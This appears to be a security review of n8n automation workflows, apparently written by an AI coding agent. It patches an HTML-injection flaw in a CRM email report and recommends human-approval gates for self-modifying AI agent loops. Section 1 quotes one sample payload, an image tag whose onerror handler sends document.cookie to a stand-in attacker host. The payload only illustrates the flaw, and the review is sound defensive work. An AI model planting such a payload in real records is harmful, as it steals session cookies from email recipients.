# n8n Workflow Security Review

Branch: `claude/review-n8n-security-fCPcd`
Date: 2026-05-10
Scope: 19 workflows discovered via the n8n MCP server (15 active, 4 inactive).

## Summary

- **18 of 19** workflows had `availableInMCP: false`, so a deep code-level audit
  was only possible for one. Action required: enable *Settings → Available in
  MCP* on each workflow listed in §3 so the rest of this review can be
  completed.
- One concrete vulnerability was found and is patched in §1.
- Three workflows form a **self-modifying agent loop** that must be gated
  behind human approval — see §2.

---

## 1. HTML/email injection — `TC — Weekly Verification Queue Report`

**Workflow ID:** `5UMcYzORF4nigho7`
**Node:** `Build Queue Report HTML` (`wvq-005`)
**Severity:** Medium (High if Facebook/Mercately/RingCentral lead names ever
flow into this report — and several active workflows do route external leads
into Zoho).

### Issue

The node interpolates Zoho lead fields directly into an HTML template with no
escaping:

```js
rows += `<tr>
  <td...><a href="${l.crm_link}" ...>${name}</a></td>
  <td...>${l.Phone||'⚠️ Missing'}</td>
  <td...>${dest}</td>
  <td...>${l.Lead_Source||'—'}</td>
  ...
  <td...>${rep}</td>
  ...`;
```

Lead names, phones, source strings, destinations and rep names originate from
externally-controllable systems (Facebook Lead Ads, RingCentral, WhatsApp via
Mercately). A lead created with a name like

```
"><img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
```

would render live HTML in the recipient's mailbox. Most desktop clients strip
`<script>` but `<img>`, `<a>`, `<style>`, CSS-based phishing and link-rewrite
attacks still work.

### Fix

Replace the body of `Build Queue Report HTML` with the patched JS in
[`patches/wvq-005-build-queue-report-html.js`](./patches/wvq-005-build-queue-report-html.js).
Diff highlights:

- New `esc()` helper — HTML-encodes `& < > " '`.
- Every lead-derived value (`name`, `dest`, `score`, `grade`, `rep`,
  `l.Phone`, `l.Lead_Source`) is wrapped in `esc(...)` before interpolation.
- `crm_link` is built from a numeric-only `id` (validated with a regex)
  before interpolation into the `href`. If Zoho ever returns a non-numeric id
  the row is skipped instead of being rendered.
- `subject` is also escape-cleaned because Gmail renders display-name
  tricks in some clients.

Apply by opening the workflow in the n8n UI, replacing the `jsCode` parameter
of node `wvq-005`, and re-publishing. The same `esc()` helper should be added
to any sibling workflow that builds Slack/Email HTML from CRM data
(see §3 — at minimum `TC — New Hot Lead Alert` and the three Slack notifiers).

### Other observations on this workflow

- `settings.saveDataSuccessExecution: "all"` persists ~500 leads of PII
  (name/phone/email) per run in the n8n DB. Recommend setting this to
  `"none"` for success runs and keeping `"all"` only for errors, plus a
  retention/prune schedule.
- Zoho `getAll` uses `limit: 500` with no pagination — a correctness, not
  security, issue, but worth fixing.
- `callerPolicy: "workflowsFromSameOwner"` is correct — keep it.

---

## 2. Autonomous agents creating new agents — REQUIRES HUMAN OVERSIGHT

The following three workflows form a closed self-improvement loop named
**"Maggie"**. Their names, schedule, and data flow strongly indicate they
generate or mutate downstream agent configuration without a human in the
loop:

| ID | Name | Status | Schedule |
|---|---|---|---|
| `8oMmmqVbPsmqEazg` | Maggie — W1 Playbook Init / Reseed | inactive | (no trigger configured yet) |
| `IJFL5DWJ5LCgAMAL` | Maggie — W2 Extraction Pipeline | inactive | nightly 02:00 |
| `layXKcZewJV3jhGp` | Maggie — W3 Pattern Ranker | inactive | nightly 04:00 |

Upstream feeders that pump data into this loop:

- `MwMUPmnGMOc0gDs3` — `TC — RingSense Insights → Maggie Pattern Extraction`
- `DRtB17JVV4MwLDhm` — `TC — RingCentral Call End → Maggie AI Follow-up`

### Why this is risky

I could not introspect the node graph because all three have
`availableInMCP: false`. Based on naming and the typical structure of such
loops:

- **W1 "Playbook Init / Reseed"** likely (re)writes the prompts, tool lists,
  or workflow definitions used by the customer-facing AI agents
  (`SimpleLife AI Voice Follow-up`, `TravelCloud AI Slack Agent Router`,
  `TravelCloud CS AI Mercately WhatsApp Agent`).
- **W2 "Extraction Pipeline"** distills call transcripts / CRM signals into
  candidate patterns.
- **W3 "Pattern Ranker"** scores patterns and (likely) promotes the winners
  back into the playbook used by W1.

If any of the three has access to:

- The `n8n-nodes-base.httpRequest` node pointed at the n8n REST API
  (`/rest/workflows`), or
- An LLM Agent with a tool that wraps `create_workflow_from_code`,
  `update_workflow`, or `publish_workflow`, or
- Direct writes to the prompt/playbook store consumed by other agents,

…then it can mutate or spawn agents on its own. They are currently
**inactive**, which is the right state until guarded.

### Required guardrails before re-activating

1. **Enable MCP access** on all three so this review can verify their tool
   surface.
2. **Insert a human-approval node** between W3's "promote" step and any
   write to the prompt/playbook store (Slack approval node, or write to a
   "pending" table the user reviews via a dashboard).
3. **Strip n8n-API write scopes** from any credential these workflows use:
   the credential should have read-only access to whatever store they pull
   from, and *no* `workflow:create / workflow:update / workflow:publish`
   scope unless explicitly required.
4. **Pin the LLM tool list**: if W1/W2/W3 use an Agent node, the tools
   array must be an explicit allowlist — no
   `n8n-nodes-langchain.toolWorkflow` pointing at workflows with mutation
   power.
5. **Log every promotion** to an append-only audit channel (a dedicated
   Slack channel or a `data_table` with a timestamp + diff) so any
   silently-applied change can be retroactively detected.
6. **Sandbox the prompt input**: pattern strings extracted in W2 are
   downstream LLM input — apply the same prompt-injection sanitization
   (delimit, strip system-prompt strings, length-limit) used elsewhere.

I will produce a detailed per-node review of W1/W2/W3 once they have MCP
access enabled.

### 2b. Three more autonomous agents — Supervisor / Sales / OPS (UNVERIFIED)

The owner has flagged a separate set of three autonomous agents named
**Supervisor**, **Sales**, and **OPS** that also create or mutate downstream
agents and must operate under human oversight.

**Visibility gap:** None of the 19 workflows returned by `search_workflows`
across both projects (`My project`, `Harry Froget <hfroget@gmail.com>`) match
those names — search queries for `"OPS"`, `"Sales"`, `"Supervisor"` all
returned zero results. Possibilities:

1. They are **archived** workflows (excluded from the default search
   response).
2. They live in a **different n8n instance** than the one this MCP server
   connects to.
3. They live in a project/folder the current MCP credential cannot list.
4. They are **sub-workflows** referenced by one of the visible workflows via
   `n8n-nodes-langchain.toolWorkflow` — most likely candidates:
   `4yMbMRvwAPIVsuE4` (TravelCloud AI — Slack Agent Router) or
   `6Kqgji1W6NEnvuSF` (TravelCloud CS AI — Mercately WhatsApp Agent).

Until the owner regains n8n access, treat these three as **unverified but
high-risk** and apply the guardrails in §2 (1)–(6) as soon as they can be
identified. Specifically:

- **Do not let the Supervisor self-spawn**. If it currently has the ability
  to call `create_workflow_from_code` / `update_workflow` /
  `publish_workflow` (either via the n8n MCP server or via an `httpRequest`
  node targeting `/rest/workflows`), strip that capability and replace it
  with a "draft → human approve → apply" two-step.
- **Sales** and **OPS** likely each carry write credentials to CRM (Zoho) and
  ops systems (RingCentral / Mercately / Slack). Their tool lists must be
  explicit allowlists with the **smallest** scope that works (e.g. Zoho
  `lead:update` on a single module, never `crm:full`).
- Add a Slack approval node (or n8n's built-in `Wait` + form trigger) before
  any tool call that **creates** records or **modifies** other agents'
  prompts/playbooks.

### Apply-when-unlocked runbook

Once the owner can sign in to n8n:

1. Confirm whether Supervisor / Sales / OPS are real workflows (search the
   workflow list including archived) or internal nodes inside the Slack /
   Mercately routers.
2. For each: toggle **Settings → Available in MCP** ON and reply "go" — I'll
   run the per-node audit and append §2c.
3. Apply the `wvq-005` patch from
   `docs/security/patches/wvq-005-build-queue-report-html.js` to the
   Verification Queue workflow.
4. Enable webhook signature verification on the six webhook-receiving
   workflows in §3.

---

## 3. Workflows still pending review (MCP not enabled)

Priority order — top group is the actual internet-exposed attack surface:

**Webhook-receivers (verify request signatures!):**
- `p0fYHq69WohYcZC7` Facebook Lead Ads → Zoho CRM — verify `X-Hub-Signature-256`
- `c6yYzZbXSg25ygTg` RingCentral → Zoho Leads — verify RingCentral `Verification-Token`
- `DRtB17JVV4MwLDhm` TC — RingCentral Call End → Maggie AI Follow-up
- `MwMUPmnGMOc0gDs3` TC — RingSense Insights → Maggie Pattern Extraction
- `6Kqgji1W6NEnvuSF` TravelCloud CS AI — Mercately WhatsApp Agent — shared-secret/signature
- `4yMbMRvwAPIVsuE4` TravelCloud AI — Slack Agent Router — verify `X-Slack-Signature` HMAC + 5-min replay window

**LLM-bearing agents (prompt-injection / tool-misuse):**
- `ZByC1P9VYGV28OI2` SimpleLife - AI Voice Follow-up Agent
- `nn4b2pMIkforxmwx` Simplelife Training Agent - Voice Call
- `KM3Hm9DHiVO8DIle` Angie, personal AI assistant (Telegram voice/text)

**HTML/Slack-injection candidates (likely repeat of §1):**
- `eBshd1k5ucLWJWs6` TC — New Hot Lead Alert (Zoho → Email)
- `1bWPAi0BwsAswyie` Daily Pipeline Summary → Slack
- `Y67cAGMNf1QeK6Bm` New Lead Alert → Slack
- `dbaOf3Xvgpr7b0bD` Deal Stage Change → Slack
- `RE376XBi8WGfEyPT` Global Error Handler → Slack — also check that error
  payloads do not leak credentials/headers/tokens.

**Other:**
- `h4btjcQk3vcTkK0z` System Health Monitor — confirm monitored endpoints
  don't surface secrets in error bodies.
